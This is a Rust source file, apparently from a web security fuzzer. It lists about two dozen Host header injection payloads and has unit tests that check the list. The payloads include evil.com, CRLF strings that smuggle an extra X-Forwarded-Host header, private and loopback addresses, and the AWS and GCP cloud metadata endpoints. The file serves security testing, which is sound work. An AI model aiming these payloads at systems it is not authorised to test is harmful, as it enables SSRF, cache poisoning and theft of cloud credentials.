use crate::fuzzer::payloads::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    vec![
        Payload {
            payload_type: PayloadType::Host,
            payload: "evil.com".to_string(),
            description: "Host header injection - basic domain".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "header-injection".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "127.0.0.1".to_string(),
            description: "Host header injection - localhost".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "localhost".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "localhost".to_string(),
            description: "Host header injection - localhost string".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "localhost".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "0.0.0.0".to_string(),
            description: "Host header injection - 0.0.0.0".to_string(),
            severity: Severity::Medium,
            tags: vec!["host".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "127.1".to_string(),
            description: "Host header injection - shortened localhost".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "localhost".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "127.0.1".to_string(),
            description: "Host header injection - alternative localhost".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "localhost".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "[::1]".to_string(),
            description: "Host header injection - IPv6 localhost".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "ipv6".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "example.com:443".to_string(),
            description: "Host header injection - with port".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "port".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "example.com#".to_string(),
            description: "Host header injection - fragment bypass".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "example.com?foo=bar".to_string(),
            description: "Host header injection - query string bypass".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "example.com%00".to_string(),
            description: "Host header injection - null byte bypass".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "bypass".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "example.com\r\nX-Forwarded-Host: evil.com".to_string(),
            description: "Host header injection - CRLF injection".to_string(),
            severity: Severity::Critical,
            tags: vec!["host".to_string(), "crlf".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "example.com%0d%0aX-Forwarded-Host: evil.com".to_string(),
            description: "Host header injection - URL encoded CRLF".to_string(),
            severity: Severity::Critical,
            tags: vec!["host".to_string(), "crlf".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "host: example.com".to_string(),
            description: "Host header injection - lowercase host".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "HOST: example.com".to_string(),
            description: "Host header injection - uppercase HOST".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "eXaMpLe.CoM".to_string(),
            description: "Host header injection - case variation".to_string(),
            severity: Severity::Medium,
            tags: vec!["host".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "example.com.evil.com".to_string(),
            description: "Host header injection - domain hijacking attempt".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "domain-hijack".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "example.com.127.0.0.1".to_string(),
            description: "Host header injection - domain + IP confusion".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "a".to_string(),
            description: "Host header injection - single character".to_string(),
            severity: Severity::Low,
            tags: vec!["host".to_string(), "test".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "".to_string(),
            description: "Host header injection - empty host".to_string(),
            severity: Severity::Low,
            tags: vec!["host".to_string(), "test".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "127.0.0.1:8080".to_string(),
            description: "Host header injection - internal port scan".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "port-scan".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "192.168.1.1".to_string(),
            description: "Host header injection - private IP".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "private-ip".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "10.0.0.1".to_string(),
            description: "Host header injection - 10.x private IP".to_string(),
            severity: Severity::High,
            tags: vec!["host".to_string(), "private-ip".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "169.254.169.254".to_string(),
            description: "Host header injection - AWS metadata".to_string(),
            severity: Severity::Critical,
            tags: vec!["host".to_string(), "cloud".to_string(), "aws".to_string()],
        },
        Payload {
            payload_type: PayloadType::Host,
            payload: "metadata.google.internal".to_string(),
            description: "Host header injection - GCP metadata".to_string(),
            severity: Severity::Critical,
            tags: vec!["host".to_string(), "cloud".to_string(), "gcp".to_string()],
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_host_payloads_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 20,
            "Expected at least 20 Host payloads, got {}",
            payloads.len()
        );
    }

    #[test]
    fn test_host_payloads_correct_type() {
        let payloads = get_payloads();
        for p in &payloads {
            assert_eq!(p.payload_type, PayloadType::Host);
        }
    }

    #[test]
    fn test_host_payloads_non_empty() {
        let payloads = get_payloads();
        for p in &payloads {
            assert!(!p.description.is_empty());
            assert!(!p.tags.is_empty());
        }
    }

    #[test]
    fn test_host_payloads_contains_localhost_variants() {
        let payloads = get_payloads();
        let has_localhost = payloads
            .iter()
            .any(|p| p.payload == "127.0.0.1" || p.payload == "localhost");
        assert!(
            has_localhost,
            "Host payloads should contain localhost variants"
        );
    }

    #[test]
    fn test_host_payloads_contains_cloud_metadata() {
        let payloads = get_payloads();
        let has_aws = payloads.iter().any(|p| p.payload == "169.254.169.254");
        let has_gcp = payloads
            .iter()
            .any(|p| p.payload == "metadata.google.internal");
        assert!(has_aws, "Host payloads should contain AWS metadata");
        assert!(has_gcp, "Host payloads should contain GCP metadata");
    }

    #[test]
    fn test_host_payloads_have_crlf_injection() {
        let payloads = get_payloads();
        let has_crlf = payloads
            .iter()
            .any(|p| p.tags.contains(&"crlf".to_string()));
        assert!(
            has_crlf,
            "Host payloads should contain CRLF injection tests"
        );
    }
}
